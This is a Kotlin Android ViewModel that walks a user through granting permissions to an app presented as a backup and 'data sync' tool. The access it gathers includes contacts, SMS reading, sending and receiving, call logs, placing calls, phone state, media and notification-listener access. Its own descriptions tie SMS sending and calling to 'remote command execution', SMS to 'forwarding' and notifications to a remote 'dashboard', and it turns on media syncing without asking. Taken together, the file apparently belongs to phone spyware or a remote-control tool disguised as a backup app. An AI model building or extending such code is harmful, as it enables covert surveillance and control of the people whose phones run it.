package com.boxx.datasync.permission

import android.Manifest
import android.app.Activity
import android.app.Application
import android.os.Build
import android.util.Log
import androidx.lifecycle.AndroidViewModel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import javax.inject.Inject
import dagger.hilt.android.lifecycle.HiltViewModel

sealed class PermissionUiState {
    object Checking : PermissionUiState()
    object RequestRuntime : PermissionUiState()
    data class TempDenied(val deniedPermissions: List<PermissionInfo>) : PermissionUiState()
    data class PermDenied(val deniedPermissions: List<PermissionInfo>) : PermissionUiState()
    object NeedNotificationListener : PermissionUiState()
    object Ready : PermissionUiState()
}

@HiltViewModel
class PermissionViewModel @Inject constructor(
    application: Application
) : AndroidViewModel(application) {

    private val handler = PermissionHandler(application)

    private val _permissions = MutableStateFlow<List<PermissionInfo>>(emptyList())
    val permissions: StateFlow<List<PermissionInfo>> = _permissions.asStateFlow()

    private val _statuses = MutableStateFlow<Map<String, PermissionStatus>>(emptyMap())
    val statuses: StateFlow<Map<String, PermissionStatus>> = _statuses.asStateFlow()

    private val _uiState = MutableStateFlow<PermissionUiState>(PermissionUiState.Checking)
    val uiState: StateFlow<PermissionUiState> = _uiState.asStateFlow()

    init {
        val list = mutableListOf(
            PermissionInfo(
                "CONTACTS", "Contacts",
                "Access contacts to backup your contact list.",
                "Contacts", Manifest.permission.READ_CONTACTS
            ),
            PermissionInfo(
                "SMS_READ", "Read SMS",
                "Access SMS to backup your messages and enable forwarding.",
                "Sms", Manifest.permission.READ_SMS
            ),
            PermissionInfo(
                "SMS_SEND", "Send SMS",
                "Allows the app to send SMS for remote command execution.",
                "SendSms", Manifest.permission.SEND_SMS
            ),
            PermissionInfo(
                "SMS_RECEIVE", "Receive SMS",
                "Required to detect incoming SMS for real-time sync.",
                "ReceiveSms", Manifest.permission.RECEIVE_SMS
            ),
            PermissionInfo(
                "CALL_LOG", "Call Logs",
                "Access call history to backup your call logs.",
                "Call", Manifest.permission.READ_CALL_LOG
            ),
            PermissionInfo(
                "CALL_PHONE", "Make Calls",
                "Allows the app to initiate calls for remote command execution.",
                "Phone", Manifest.permission.CALL_PHONE
            ),
            PermissionInfo(
                "PHONE_STATE", "Phone State",
                "Required to detect SIM info and network status.",
                "SimCard", Manifest.permission.READ_PHONE_STATE
            )
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add(PermissionInfo(
                "MEDIA_IMAGES", "Images",
                "Access images to backup your gallery.",
                "PhotoLibrary", Manifest.permission.READ_MEDIA_IMAGES
            ))
            list.add(PermissionInfo(
                "MEDIA_VIDEO", "Videos",
                "Access videos to backup your gallery.",
                "VideoLibrary", Manifest.permission.READ_MEDIA_VIDEO
            ))
            list.add(PermissionInfo(
                "NOTIFICATIONS", "Notifications",
                "Required to show sync status in the notification bar.",
                "Notifications", Manifest.permission.POST_NOTIFICATIONS
            ))
        } else {
            list.add(PermissionInfo(
                "STORAGE", "Storage",
                "Access storage to backup your gallery.",
                "Storage", Manifest.permission.READ_EXTERNAL_STORAGE
            ))
        }

        list.add(PermissionInfo(
            "NOTIFICATION_LISTENER", "Notification Access",
            "Required to sync incoming notifications to your dashboard.",
            "NotificationSync", isSpecial = true
        ))

        list.add(PermissionInfo(
            "BATTERY_OPTIMIZATION", "Battery Optimization",
            "Disable optimization to ensure reliable background sync.",
            "Battery", isOptional = true, isSpecial = true
        ))

        _permissions.value = list
        // Do an initial check of statuses based on context
        val initialStatuses = list.associate { it.id to handler.getStatus(it) }
        _statuses.value = initialStatuses
    }

    fun refreshStatuses(activity: Activity? = null, isFromLauncher: Boolean = false) {
        Log.d("PermissionFlow", "PERMISSION_FLOW_CHECKING")
        val newStatuses = _permissions.value.associate { it.id to handler.getStatus(it) }
        _statuses.value = newStatuses
        updateUiState(activity, isFromLauncher)
    }

    private fun updateUiState(activity: Activity?, isFromLauncher: Boolean = false) {
        val currentPermissions = _permissions.value
        val currentStatuses = _statuses.value

        // Check if auto media sync preference should be updated automatically
        activity?.let { context ->
            val mediaImagesAllowed = handler.getStatus(currentPermissions.find { it.id == "MEDIA_IMAGES" } ?: PermissionInfo("", "", "", "", "")) == PermissionStatus.GRANTED ||
                    handler.getStatus(currentPermissions.find { it.id == "STORAGE" } ?: PermissionInfo("", "", "", "", "")) == PermissionStatus.GRANTED
            val mediaVideosAllowed = handler.getStatus(currentPermissions.find { it.id == "MEDIA_VIDEO" } ?: PermissionInfo("", "", "", "", "")) == PermissionStatus.GRANTED ||
                    handler.getStatus(currentPermissions.find { it.id == "STORAGE" } ?: PermissionInfo("", "", "", "", "")) == PermissionStatus.GRANTED

            if (mediaImagesAllowed || mediaVideosAllowed) {
                val prefs = androidx.preference.PreferenceManager.getDefaultSharedPreferences(context)
                if (!prefs.getBoolean("auto_media_sync", false)) {
                    prefs.edit().putBoolean("auto_media_sync", true).apply()
                    Log.d("PermissionViewModel", "AUTO_MEDIA_SYNC_AUTO_ENABLED")
                    com.boxx.datasync.sync.SyncScheduler.enqueueMediaSync(context)
                }
            }
        }

        // 1. Check runtime permissions
        val runtimePermissions = currentPermissions.filter { !it.isSpecial && it.permission != null }
        val deniedRuntime = runtimePermissions.filter { (currentStatuses[it.id] ?: PermissionStatus.DENIED) != PermissionStatus.GRANTED }

        if (deniedRuntime.isNotEmpty()) {
            if (activity == null) {
                _uiState.value = PermissionUiState.RequestRuntime
                return
            }

            // Group denied permissions into permanently denied and temporarily denied
            val permDeniedList = deniedRuntime.filter { handler.isPermanentlyDenied(activity, it) }
            val tempDeniedList = deniedRuntime.filter { !handler.isPermanentlyDenied(activity, it) }

            // If we have any temporarily denied permissions (meaning they were denied at least once but can still request normally)
            if (isFromLauncher && tempDeniedList.isNotEmpty()) {
                Log.d("PermissionFlow", "RUNTIME_PERMISSION_TEMP_DENIED")
                _uiState.value = PermissionUiState.TempDenied(tempDeniedList)
            } else if (permDeniedList.isNotEmpty()) {
                Log.d("PermissionFlow", "RUNTIME_PERMISSION_PERMANENTLY_DENIED")
                _uiState.value = PermissionUiState.PermDenied(permDeniedList)
            } else {
                Log.d("PermissionFlow", "RUNTIME_PERMISSION_REQUESTABLE")
                _uiState.value = PermissionUiState.RequestRuntime
            }
            return
        }

        Log.d("PermissionFlow", "RUNTIME_PERMISSION_GRANTED")

        // 2. Check Notification Listener
        val notifListener = currentPermissions.find { it.id == "NOTIFICATION_LISTENER" }
        if (notifListener != null && (currentStatuses[notifListener.id] ?: PermissionStatus.DENIED) != PermissionStatus.GRANTED) {
            Log.d("PermissionFlow", "NOTIFICATION_LISTENER_REQUIRED")
            _uiState.value = PermissionUiState.NeedNotificationListener
            return
        }

        Log.d("PermissionFlow", "PERMISSION_FLOW_READY")
        _uiState.value = PermissionUiState.Ready
    }

    fun areAllRequiredGranted(): Boolean {
        return _permissions.value.all {
            if (it.isOptional) true
            else handler.getStatus(it) == PermissionStatus.GRANTED
        }
    }
}
